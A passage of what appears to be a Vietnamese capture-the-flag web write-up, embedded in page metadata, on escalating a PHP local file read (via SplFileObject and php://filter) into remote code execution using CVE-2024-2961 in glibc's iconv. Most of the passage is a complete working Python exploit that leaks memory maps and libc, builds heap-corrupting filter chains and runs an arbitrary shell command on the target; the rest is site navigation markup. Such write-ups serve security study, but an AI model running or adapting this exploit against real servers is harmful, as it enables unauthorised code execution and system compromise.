\u003ccode\u003eetc\/passwd\u003c\/code\u003e tuy nhiên flag có quyền Owner vậy nên chưa đủ quyền để đọc\n\u003cfigure\u003e\u003cimg\n    class=\u0022my-0 rounded-md\u0022\n    loading=\u0022lazy\u0022\n    decoding=\u0022async\u0022\n    fetchpriority=\u0022low\u0022\n    alt=\u0022image\u0022\n    src=\u0022https:\/\/hackmd.io\/_uploads\/rJzRNiVUZg.png\u0022\n    \u003e\u003c\/figure\u003e\n\u003c\/li\u003e\n\u003c\/ul\u003e\n\n\u003ch3 class=\u0022relative group\u0022\u003eNâng quyền\n    \u003cdiv id=\u0022nâng-quyền\u0022 class=\u0022anchor\u0022\u003e\u003c\/div\u003e\n    \n    \u003cspan\n        class=\u0022absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none\u0022\u003e\n        \u003ca class=\u0022text-primary-300 dark:text-neutral-700 !no-underline\u0022 href=\u0022#n%c3%a2ng-quy%e1%bb%81n\u0022 aria-label=\u0022Anchor\u0022\u003e#\u003c\/a\u003e\n    \u003c\/span\u003e\n    \n\u003c\/h3\u003e\n\u003cul\u003e\n\u003cli\u003eNgay khi thực hiện được \u003ccode\u003eSPLFileObject\u003c\/code\u003e như ở trên ta cũng có thể biến thể để nâng lên từ đọc file thành RCE từ \u003ca\n  href=\u0022https:\/\/github.com\/ambionics\/cnext-exploits\/blob\/main\/cnext-exploit.py\u0022\n    target=\u0022_blank\u0022\n  \u003eđoạn tài liệu sau\u003c\/a\u003e và \u003ca\n  href=\u0022https:\/\/blog.lexfo.fr\/iconv-cve-2024-2961-p1.html\u0022\n    target=\u0022_blank\u0022\n  \u003ecái này\u003c\/a\u003e\n\u003cfigure\u003e\u003cimg\n    class=\u0022my-0 rounded-md\u0022\n    loading=\u0022lazy\u0022\n    decoding=\u0022async\u0022\n    fetchpriority=\u0022low\u0022\n    alt=\u0022image\u0022\n    src=\u0022https:\/\/hackmd.io\/_uploads\/SJfsHsVIZl.png\u0022\n    \u003e\u003c\/figure\u003e\n\u003c\/li\u003e\n\u003cli\u003eSau đây sẽ là PWN CORE , mình đéo biết giải thích như nào nên chạy code thôi ; Vào \u003ccode\u003ehttp:\/\/localhost:5000\/\u003c\/code\u003e để check id\u003c\/li\u003e\n\u003c\/ul\u003e\n\u003cpre tabindex=\u00220\u0022\u003e\u003ccode class=\u0022language-php=\u0022 data-lang=\u0022php=\u0022\u003eimport requests\nfrom pwn import *\nimport re\nimport base64\nimport zlib\nfrom bs4 import BeautifulSoup\n\nsession = requests.Session()\n\n## Constant\n\nHEAP_SIZE = 2 * 1024 * 1024\nBUG = \u0026#34;劄\u0026#34;.encode(\u0026#34;utf-8\u0026#34;)\n\n## Post init function\n\ndef get_file(url, path):\n    path = f\u0026#34;php:\/\/filter\/convert.base64-encode\/resource={path}\u0026#34;\n    r = session.post(url \u002b \u0026#39;login.php\u0026#39;, data={\u0026#39;username\u0026#39;:\u0026#39;winky\u0026#39;})\n    r = session.post(url \u002b \u0026#39;index.php\u0026#39;, data={\u0026#39;note\u0026#39;:path})\n    r = session.post(url \u002b \u0026#39;\/premium.php\/index.php\u0026#39;, data={\u0026#39;color\u0026#39;: \u0026#39;SplFileObject\u0026#39;})\n    r = session.get(url \u002b \u0026#39;index.php\u0026#39;)\n    soup = BeautifulSoup(r.text, \u0026#34;html.parser\u0026#34;)\n    data = soup.find(\u0026#34;div\u0026#34;, id=\u0026#34;noteContent\u0026#34;).get_text(strip=True)\n    return base64.b64decode(data)\n\ndef compress(data):\n    return zlib.compress(data, 9)[2:-4]\n\ndef compressed_bucket(data):\n    return chunked_chunk(data, 0x8000)\n\ndef qpe(data):\n    return \u0026#34;\u0026#34;.join(f\u0026#34;={x:02x}\u0026#34; for x in data).upper().encode()\n\ndef ptr_bucket(*ptrs, size=None):\n    if size is not None:\n        assert len(ptrs) * 8 == size\n    bucket = b\u0026#34;\u0026#34;.join(map(p64, ptrs))\n    bucket = qpe(bucket)\n    bucket = chunked_chunk(bucket)\n    bucket = chunked_chunk(bucket)\n    bucket = chunked_chunk(bucket)\n    bucket = compressed_bucket(bucket)\n    return bucket\n\ndef chunked_chunk(data, size: int = None):\n    if size is None:\n        size = len(data) \u002b 8\n    keep = len(data) \u002b len(b\u0026#34;\\n\\n\u0026#34;)\n    size = f\u0026#34;{len(data):x}\u0026#34;.rjust(size - keep, \u0026#34;0\u0026#34;)\n    return size.encode() \u002b b\u0026#34;\\n\u0026#34; \u002b data \u002b b\u0026#34;\\n\u0026#34;\n\n## Pwn core\n\nclass PWN_Core():\n    def __init__(self, url, command) -\u0026gt; None:\n        self.url = url\n        self.command = command\n        self.info = {}\n        self.heap = None\n        self.pad = 20\n        \n    class Region():\n        def __init__(self, start, stop, permissions, path):\n            self.start = int(start)\n            self.stop = int(stop)\n            self.permissions = permissions\n            self.path = path\n        \n        @property\n        def size(self) -\u0026gt; int:\n            return self.stop - self.start\n    \n    def download_file(self, remote_path: str, local_path: str) -\u0026gt; None:\n        data = get_file(self.url, remote_path)\n        Path(local_path).write_bytes(data)\n    \n    def get_regions(self):\n        maps = get_file(self.url, \u0026#34;\/proc\/self\/maps\u0026#34;)\n        maps = maps.decode()\n        PATTERN = re.compile(\n            r\u0026#34;^([a-f0-9]\u002b)-([a-f0-9]\u002b)\\b\u0026#34; r\u0026#34;.*\u0026#34; r\u0026#34;\\s([-rwx]{3}[ps])\\s\u0026#34; r\u0026#34;(.*)\u0026#34;\n        )\n        regions = []\n        for region in [line.strip() for line in maps.strip().split(\u0026#39;\\n\u0026#39;)]:\n            if match := PATTERN.match(region):\n                start = int(match.group(1), 16)\n                stop = int(match.group(2), 16)\n                permissions = match.group(3)\n                path = match.group(4)\n                if \u0026#34;\/\u0026#34; in path or \u0026#34;[\u0026#34; in path:\n                    path = path.rsplit(\u0026#34; \u0026#34;, 1)[-1]\n                else:\n                    path = \u0026#34;\u0026#34;\n                current = self.Region(start, stop, permissions, path)\n                regions.append(current)\n                \n            else:\n                print(maps)\n        return regions\n\n    def _get_region(self, regions: list[Region], *names: str) -\u0026gt; Region:\n        for region in regions:\n            if any(name in region.path for name in names):\n                break\n        return region\n\n    def find_main_heap(self, regions):\n        heaps = [\n            region.stop - HEAP_SIZE \u002b 0x40\n            for region in reversed(regions)\n            if region.permissions == \u0026#34;rw-p\u0026#34;\n            and region.size \u0026gt;= HEAP_SIZE\n            and region.stop \u0026amp; (HEAP_SIZE-1) == 0\n            and region.path in (\u0026#34;\u0026#34;, \u0026#34;[anon:zend_alloc]\u0026#34;)\n        ]\n        first = heaps[0]\n        if len(heaps) \u0026gt; 1:\n            heaps = \u0026#34;, \u0026#34;.join(map(hex, heaps))\n        return first\n\n    def get_symbols_and_addresses(self) -\u0026gt; None:\n        regions = self.get_regions()\n        LIBC_FILE = \u0026#34;.\/libc\u0026#34;\n        self.info[\u0026#34;heap\u0026#34;] = self.find_main_heap(regions)\n        libc = self._get_region(regions, \u0026#34;libc-\u0026#34;, \u0026#34;libc.so\u0026#34;)\n        self.download_file(libc.path, LIBC_FILE)\n        self.info[\u0026#34;libc\u0026#34;] = ELF(LIBC_FILE, checksec=False)\n        self.info[\u0026#34;libc\u0026#34;].address = libc.start\n\n    def build_exploit_path(self):\n        \n        self.get_symbols_and_addresses()\n        \n        LIBC = self.info[\u0026#34;libc\u0026#34;]\n        ADDR_EMALLOC = LIBC.symbols[\u0026#34;__libc_malloc\u0026#34;]\n        ADDR_EFREE = LIBC.symbols[\u0026#34;__libc_system\u0026#34;]\n        ADDR_EREALLOC = LIBC.symbols[\u0026#34;__libc_realloc\u0026#34;]\n        ADDR_HEAP = self.info[\u0026#34;heap\u0026#34;]\n        ADDR_FREE_SLOT = ADDR_HEAP \u002b 0x20\n        ADDR_CUSTOM_HEAP = ADDR_HEAP \u002b 0x0168\n        ADDR_FAKE_BIN = ADDR_FREE_SLOT - 0x10\n        CS = 0x100\n\n        pad_size = CS - 0x18\n        pad = b\u0026#34;\\x00\u0026#34; * pad_size\n        pad = chunked_chunk(pad, len(pad) \u002b 6)\n        pad = chunked_chunk(pad, len(pad) \u002b 6)\n        pad = chunked_chunk(pad, len(pad) \u002b 6)\n        pad = compressed_bucket(pad)\n\n        step1_size = 1\n        step1 = b\u0026#34;\\x00\u0026#34; * step1_size\n        step1 = chunked_chunk(step1)\n        step1 = chunked_chunk(step1)\n        step1 = chunked_chunk(step1, CS)\n        step1 = compressed_bucket(step1)\n        \n        step2_size = 0x48\n        step2 = b\u0026#34;\\x00\u0026#34; * (step2_size \u002b 8)\n        step2 = chunked_chunk(step2, CS)\n        step2 = chunked_chunk(step2)\n        step2 = compressed_bucket(step2)\n\n        step2_write_ptr = b\u0026#34;0\\n\u0026#34;.ljust(step2_size, b\u0026#34;\\x00\u0026#34;) \u002b p64(ADDR_FAKE_BIN)\n        step2_write_ptr = chunked_chunk(step2_write_ptr, CS)\n        step2_write_ptr = chunked_chunk(step2_write_ptr)\n        step2_write_ptr = compressed_bucket(step2_write_ptr)\n\n        step3_size = CS\n        step3 = b\u0026#34;\\x00\u0026#34; * step3_size\n        assert len(step3) == CS\n        step3 = chunked_chunk(step3)\n        step3 = chunked_chunk(step3)\n        step3 = chunked_chunk(step3)\n        step3 = compressed_bucket(step3)\n\n        step3_overflow = b\u0026#34;\\x00\u0026#34; * (step3_size - len(BUG)) \u002b BUG\n        assert len(step3_overflow) == CS\n        step3_overflow = chunked_chunk(step3_overflow)\n        step3_overflow = chunked_chunk(step3_overflow)\n        step3_overflow = chunked_chunk(step3_overflow)\n        step3_overflow = compressed_bucket(step3_overflow)\n\n        step4_size = CS\n        step4 = b\u0026#34;=00\u0026#34; \u002b b\u0026#34;\\x00\u0026#34; * (step4_size - 1)\n        step4 = chunked_chunk(step4)\n        step4 = chunked_chunk(step4)\n        step4 = chunked_chunk(step4)\n        step4 = compressed_bucket(step4)\n        \n        step4_pwn = ptr_bucket(\n            0x200000,\n            0,\n            # free_slot\n            0,\n            0,\n            ADDR_CUSTOM_HEAP,  # 0x18\n            0,\n            0,\n            0,\n            0,\n            0,\n            0,\n            0,\n            0,\n            0,\n            0,\n            0,\n            0,\n            0,\n            ADDR_HEAP,  # 0x140\n            0,\n            0,\n            0,\n            0,\n            0,\n            0,\n            0,\n            0,\n            0,\n            0,\n            0,\n            0,\n            0,\n            size=CS,\n        )\n\n        step4_custom_heap = ptr_bucket(\n            ADDR_EMALLOC, ADDR_EFREE, ADDR_EREALLOC, size=0x18\n        )\n        \n        step4_use_custom_heap_size = 0x140\n        \n        COMMAND = self.command\n        COMMAND = f\u0026#34;kill -9 $PPID; {COMMAND}\u0026#34;\n        COMMAND = COMMAND.encode() \u002b b\u0026#34;\\x00\u0026#34;\n\n        COMMAND = COMMAND.ljust(step4_use_custom_heap_size, b\u0026#34;\\x00\u0026#34;)\n\n        step4_use_custom_heap = COMMAND\n        step4_use_custom_heap = qpe(step4_use_custom_heap)\n        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)\n        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)\n        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)\n        step4_use_custom_heap = compressed_bucket(step4_use_custom_heap)\n        \n        pages = (\n            step4 * 3\n            \u002b step4_pwn\n            \u002b step4_custom_heap\n            \u002b step4_use_custom_heap\n            \u002b step3_overflow\n            \u002b pad * self.pad\n            \u002b step1 * 3\n            \u002b step2_write_ptr\n            \u002b step2 * 2\n        )\n        \n        resource = compress(compress(pages))\n        resource = base64.b64encode(resource).decode()\n        resource = f\u0026#34;data:text\/plain;base64,{resource}\u0026#34;\n        \n        filters = [\n            # Create buckets\n            \u0026#34;zlib.inflate\u0026#34;,\n            \u0026#34;zlib.inflate\u0026#34;,\n            \n            # Step 0: Setup heap\n            \u0026#34;dechunk\u0026#34;,\n            \u0026#34;convert.iconv.L1.L1\u0026#34;,\n            \n            # Step 1: Reverse FL order\n            \u0026#34;dechunk\u0026#34;,\n            \u0026#34;convert.iconv.L1.L1\u0026#34;,\n            \n            # Step 2: Put fake pointer and make FL order back to normal\n            \u0026#34;dechunk\u0026#34;,\n            \u0026#34;convert.iconv.L1.L1\u0026#34;,\n            \n            # Step 3: Trigger overflow\n            \u0026#34;dechunk\u0026#34;,\n            \u0026#34;convert.iconv.UTF-8.ISO-2022-CN-EXT\u0026#34;,\n            \n            # Step 4: Allocate at arbitrary address and change zend_mm_heap\n            \u0026#34;convert.quoted-printable-decode\u0026#34;,\n            \u0026#34;convert.iconv.L1.L1\u0026#34;,\n        ]\n        filters = \u0026#34;|\u0026#34;.join(filters)\n        path = f\u0026#34;php:\/\/filter\/read={filters}\/resource={resource}\u0026#34;\n        return path\n\ndef solve():\n    URL = \u0026#39;http:\/\/localhost:5000\/\u0026#39;\n    \n    command = \u0026#39;id \u0026gt; \/tmp\/check_id\u0026#39;\n    \n    print(f\u0026#39;[\u002b] Build payload với lệnh: {command}\u0026#39;)\n    path = PWN_Core(URL, command).build_exploit_path()\n    \n    # 2. Gửi Exploit (Chấp nhận lỗi 502\/Server Crash)\n    try:\n        print(\u0026#39;[*] Đang gửi payload kích hoạt RCE...\u0026#39;)\n        # Bước này server có thể trả về 502 do tiến trình crash, ta dùng try\/except để bỏ qua lỗi\n        # Lưu ý: Không gọi get_file ở đây để đọc kết quả ngay, vì hàm get_file sẽ fail khi parse HTML lỗi\n        \n        # Tự gửi request thủ công để tránh logic parse HTML của hàm get_file\n        exploit_payload = f\u0026#34;php:\/\/filter\/convert.base64-encode\/resource={path}\u0026#34;\n        session.post(URL \u002b \u0026#39;login.php\u0026#39;, data={\u0026#39;username\u0026#39;:\u0026#39;winky\u0026#39;})\n        session.post(URL \u002b \u0026#39;index.php\u0026#39;, data={\u0026#39;note\u0026#39;: exploit_payload})\n        session.post(URL \u002b \u0026#39;\/premium.php\/index.php\u0026#39;, data={\u0026#39;color\u0026#39;: \u0026#39;SplFileObject\u0026#39;})\n        session.get(URL \u002b \u0026#39;index.php\u0026#39;, timeout=5) # Kích hoạt exploit\n        \n    except Exception as e:\n        # Lỗi 502 hoặc timeout là dấu hiệu tốt (server đang xử lý\/crash do exploit)\n        print(f\u0026#39;[!] Server phản hồi\/crash (điều này là bình thường với CVE-2024-2961): {e}\u0026#39;)\n    \n    # 3. Đợi hệ thống đồng bộ file\n    import time\n    print(\u0026#39;[*] Đợi 2 giây để lệnh thực thi xong...\u0026#39;)\n    time.sleep(2)\n    \n    # 4. Đọc kết quả từ file \/tmp\/check_id bằng LFI (Sử dụng lại hàm get_file)\n    print(\u0026#39;[*] Đang đọc kết quả từ \/tmp\/check_id...\u0026#39;)\n    try:\n        # Dùng chính tính năng SplFileObject để đọc file kết quả\n        result = get_file(URL, \u0026#34;\/tmp\/check_id\u0026#34;)\n        \n        if result:\n            print(\u0026#39;\\n[\u002b] KẾT QUẢ COMMAND ID:\u0026#39;)\n            print(\u0026#39;=\u0026#39;*40)\n            print(result.decode(\u0026#39;utf-8\u0026#39;).strip())\n            print(\u0026#39;=\u0026#39;*40)\n        else:\n            print(\u0026#39;[-] Không đọc được kết quả. Có thể exploit chưa thành công.\u0026#39;)\n            \n    except Exception as e:\n        print(f\u0026#39;[-] Lỗi khi đọc file kết quả: {e}\u0026#39;)\n\nif __name__ == \u0026#34;__main__\u0026#34;:\n    solve()\n\u003c\/code\u003e\u003c\/pre\u003e\u003cp\u003e\u003cfigure\u003e\u003cimg\n    class=\u0022my-0 rounded-md\u0022\n    loading=\u0022lazy\u0022\n    decoding=\u0022async\u0022\n    fetchpriority=\u0022low\u0022\n    alt=\u0022image\u0022\n    src=\u0022https:\/\/hackmd.io\/_uploads\/SyU18T4I-g.png\u0022\n    \u003e\u003c\/figure\u003e\n\u003c\/p\u003e","inLanguage":"en","url":"https:\/\/mtasecurity.github.io\/MSEC\/web\/0xl4ugh\/","author":{"@type":"Person","name":""},"mainEntityOfPage":"true","wordCount":"3757"}]</script></head><body class="flex flex-col h-screen m-auto leading-7 max-w-7xl px-6 sm:px-14 md:px-24 lg:px-32 text-lg bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600"><div id=the-top class="absolute flex self-center"><a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600" href=#main-content><span class="font-bold text-primary-600 pe-2 dark:text-primary-400">&darr;</span>
Skip to main content</a></div><div class=min-h-[148px]></div><div class="fixed inset-x-0 z-100"><div id=menu-blur class="absolute opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-2xl shadow-2xl"></div><div class="relative m-auto leading-7 max-w-7xl px-6 sm:px-14 md:px-24 lg:px-32"><div class="main-menu flex items-center justify-between py-6 md:justify-start gap-x-3 pt-[2px] pr-2 md:pr-4 pb-[3px] pl-0"><div><a href=/MSEC/ class=flex><span class=sr-only>MSEC</span>
<img src=/MSEC/ee.png width=250 height=250 class="logo max-h-[5rem] max-w-[5rem] object-scale-down object-left nozoom" alt></a></div><div class="flex flex-1 items-center justify-between"><nav class="flex space-x-3"><a href=/MSEC/ class="text-base font-medium">MSEC</a></nav><nav class="hidden md:flex items-center gap-x-5 md:ml-12 h-12"><a href class="flex items-center hover:text-primary-600 dark:hover:text-primary-400" aria-label=CRYPTO title><span class=mr-1><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M502.285 159.704l-234-156c-7.987-4.915-16.511-4.96-24.571.0l-234 156C3.714 163.703.0 170.847.0 177.989v155.999c0 7.143 3.714 14.286 9.715 18.286l234 156.022c7.987 4.915 16.511 4.96 24.571.0l234-156.022c6-3.999 9.715-11.143 9.715-18.286V177.989c-.001-7.142-3.715-14.286-9.716-18.285zM278 63.131l172.286 114.858-76.857 51.429L278 165.703V63.131zm-44 0v102.572l-95.429 63.715-76.857-51.429L234 63.131zM44 219.132l55.143 36.857L44 292.846v-73.714zm190 229.715L61.714 333.989l76.857-51.429L234 346.275v102.572zm22-140.858-77.715-52 77.715-52 77.715 52-77.715 52zm22 140.858V346.275l95.429-63.715 76.857 51.429L278 448.847zm190-156.001-55.143-36.857L468 219.132v73.714z"/></svg></span></span><p class="text-base font-medium">CRYPTO</p></a><a href=/MSEC/for/ class="flex items-center hover:text-primary-600 dark:hover:text-primary-400" aria-label=FOR title=FORs><span class=mr-1><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M48 64C21.5 64 0 85.5.0 112c0 15.1 7.1 29.3 19.2 38.4L236.8 313.6c11.4 8.5 27 8.5 38.4.0L492.8 150.4c12.1-9.1 19.2-23.3 19.2-38.4.0-26.5-21.5-48-48-48H48zM0 176V384c0 35.3 28.7 64 64 64H448c35.3.0 64-28.7 64-64V176L294.4 339.2c-22.8 17.1-54 17.1-76.8.0L0 176z"/></svg></span></span><p class="text-base font-medium">FOR</p></a><a href=/MSEC/pwn/ class="flex items-center hover:text-primary-600 dark:hover:text-primary-400" aria-label=PWN title=PWNs><span class=mr-1><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M256 8C119.252 8 8 119.252 8 256s111.252 248 248 248 248-111.252 248-248S392.748 8 256 8zm163.97 114.366c29.503 36.046 47.369 81.957 47.835 131.955-6.984-1.477-77.018-15.682-147.502-6.818-5.752-14.041-11.181-26.393-18.617-41.614 78.321-31.977 113.818-77.482 118.284-83.523zM396.421 97.87c-3.81 5.427-35.697 48.286-111.021 76.519-34.712-63.776-73.185-116.168-79.04-124.008 67.176-16.193 137.966 1.27 190.061 47.489zm-230.48-33.25c5.585 7.659 43.438 60.116 78.537 122.509-99.087 26.313-186.36 25.934-195.834 25.809C62.38 147.205 106.678 92.573 165.941 64.62zM44.17 256.323c0-2.166.043-4.322.108-6.473 9.268.19 111.92 1.513 217.706-30.146 6.064 11.868 11.857 23.915 17.174 35.949-76.599 21.575-146.194 83.527-180.531 142.306C64.794 360.405 44.17 310.73 44.17 256.323zm81.807 167.113c22.127-45.233 82.178-103.622 167.579-132.756 29.74 77.283 42.039 142.053 45.189 160.638-68.112 29.013-150.015 21.053-212.768-27.882zm248.38 8.489c-2.171-12.886-13.446-74.897-41.152-151.033 66.38-10.626 124.7 6.768 131.947 9.055-9.442 58.941-43.273 109.844-90.795 141.978z"/></svg></span></span><p class="text-base font-medium">PWN</p></a><a href=/MSEC/re/ class="flex items-center hover:text-primary-600 dark:hover:text-primary-400" aria-label=RE title=REs><span class=mr-1><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M47.6 300.4 228.3 469.1c7.5 7 17.4 10.9 27.7 10.9s20.2-3.9 27.7-10.9L464.4 300.4c30.4-28.3 47.6-68 47.6-109.5v-5.8c0-69.9-50.5-129.5-119.4-141C347 36.5 300.6 51.4 268 84L256 96 244 84c-32.6-32.6-79-47.5-124.6-39.9C50.5 55.6.0 115.2.0 185.1v5.8c0 41.5 17.2 81.2 47.6 109.5z"/></svg></span></span><p class="text-base font-medium">RE</p></a><a href=/MSEC/web/ class="flex items-center hover:text-primary-600 dark:hover:text-primary-400" aria-label=WEB title=WEBs><span class=mr-1><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M256 232.562c-21.183-41.196-78.868-117.97-132.503-155.834-51.378-36.272-70.978-29.987-83.828-24.181-14.872 6.72-17.577 29.554-17.577 42.988.0 13.433 7.365 110.138 12.169 126.281 15.873 53.336 72.376 71.358 124.413 65.574 2.66-.395 5.357-.759 8.089-1.097-2.68.429-5.379.796-8.089 1.097-76.259 11.294-143.984 39.085-55.158 137.972C201.224 526.527 237.424 403.67 256 341.379c18.576 62.291 39.972 180.718 150.734 83.983 83.174-83.983 22.851-126.674-53.408-137.969-2.71-.302-5.409-.667-8.089-1.096 2.732.337 5.429.702 8.089 1.096 52.037 5.785 108.54-12.239 124.413-65.574 4.804-16.142 12.169-112.847 12.169-126.281.0-13.434-2.705-36.267-17.577-42.988-12.85-5.806-32.45-12.09-83.829 24.181C334.868 114.595 277.183 191.366 256 232.562z"/></svg></span></span><p class="text-base font-medium">WEB</p></a><a href class="flex items-center hover:text-primary-600 dark:hover:text-primary-400" title></a><button id=search-button aria-label=Search class="text-base hover:text-primary-600 dark:hover:text-primary-400" title="Search (/)">
<span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></button><div class="flex items-center"><button id=appearance-switcher aria-label="Dark mode switcher" type=button class="text-base hover:text-primary-600 dark:hover:text-primary-400"><div class="flex items-center justify-center dark:hidden"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M32 256C32 132.2 132.3 32 255.8 32c11.36.0 29.7 1.668 40.9 3.746 9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3 9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480 132.1 480 32 379.6 32 256z"/></svg></span></div><div class="items-center justify-center hidden dark:flex"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02.0-95.1 42.98-95.1 95.1s41.2 96.9 95.1 96.9 95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347l-63.2-91.9 63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89 164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6 12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256 2.74 347.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7 19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109 109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69.0-127.1-57.31-127.1-127.1.0-70.69 57.31-127.1 127.1-127.1S383.1 186.2 383.1 256c0 70.7-56.4 127.1-127.1 127.1z"/></svg></span></div></button></div></nav><div class="flex md:hidden items-center gap-x-5 md:ml-12 h-12"><span></span>
<button id=search-button-mobile aria-label=Search class="text-base hover:text-primary-600 dark:hover:text-primary-400" title="Search (/)">
<span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
</span></button>
<button id=appearance-switcher-mobile aria-label="Dark mode switcher" type=button class="text-base hover:text-primary-600 dark:hover:text-primary-400 me-1"><div class="flex items-center justify-center dark:hidden"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M32 256C32 132.2 132.3 32 255.8 32c11.36.0 29.7 1.668 40.9 3.746 9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3 9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480 132.1 480 32 379.6 32 256z"/></svg></span></div><div class="items-center justify-center hidden dark:flex"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02.0-95.1 42.98-95.1 95.1s41.2 96.9 95.1 96.9 95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347l-63.2-91.9 63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89 164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6 12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256 2.74 347.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7 19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109 109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69.0-127.1-57.31-127.1-127.1.0-70.69 57.31-127.1 127.1-127.1S383.1 186.2 383.1 256c0 70.7-56.4 127.1-127.1 127.1z"/></svg></span></div></button></div></div><div class="-my-2 md:hidden"><div id=menu-button class=block><div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400"><span class="relative block icon"><svg viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416c17.7.0 32 14.33 32 32 0 17.7-14.3 32-32 32H32C14.33 128 0 113.7.0 96zM0 256c0-17.7 14.33-32 32-32H416c17.7.0 32 14.3 32 32s-14.3 32-32 32H32c-17.67.0-32-14.3-32-32zM416 448H32c-17.67.0-32-14.3-32-32s14.33-32 32-32H416c17.7.0 32 14.3 32 32s-14.3 32-32 32z"/></svg></span></div><div id=menu-wrapper class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50 pt-[5px]"><ul class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none text-end max-w-7xl"><li id=menu-close-button><span class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400"><span class="relative block icon"><svg viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75.0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3 54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75.0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75.0-45.25s32.75-12.5 45.25.0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25.0s12.5 32.75.0 45.25l-105.4 105.4L310.6 361.4z"/></svg></span></span></li><li class=mt-1><a href class="flex items-center hover:text-primary-600 dark:hover:text-primary-400" aria-label=CRYPTO title><div class=mr-2><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M502.285 159.704l-234-156c-7.987-4.915-16.511-4.96-24.571.0l-234 156C3.714 163.703.0 170.847.0 177.989v155.999c0 7.143 3.714 14.286 9.715 18.286l234 156.022c7.987 4.915 16.511 4.96 24.571.0l234-156.022c6-3.999 9.715-11.143 9.715-18.286V177.989c-.001-7.142-3.715-14.286-9.716-18.285zM278 63.131l172.286 114.858-76.857 51.429L278 165.703V63.131zm-44 0v102.572l-95.429 63.715-76.857-51.429L234 63.131zM44 219.132l55.143 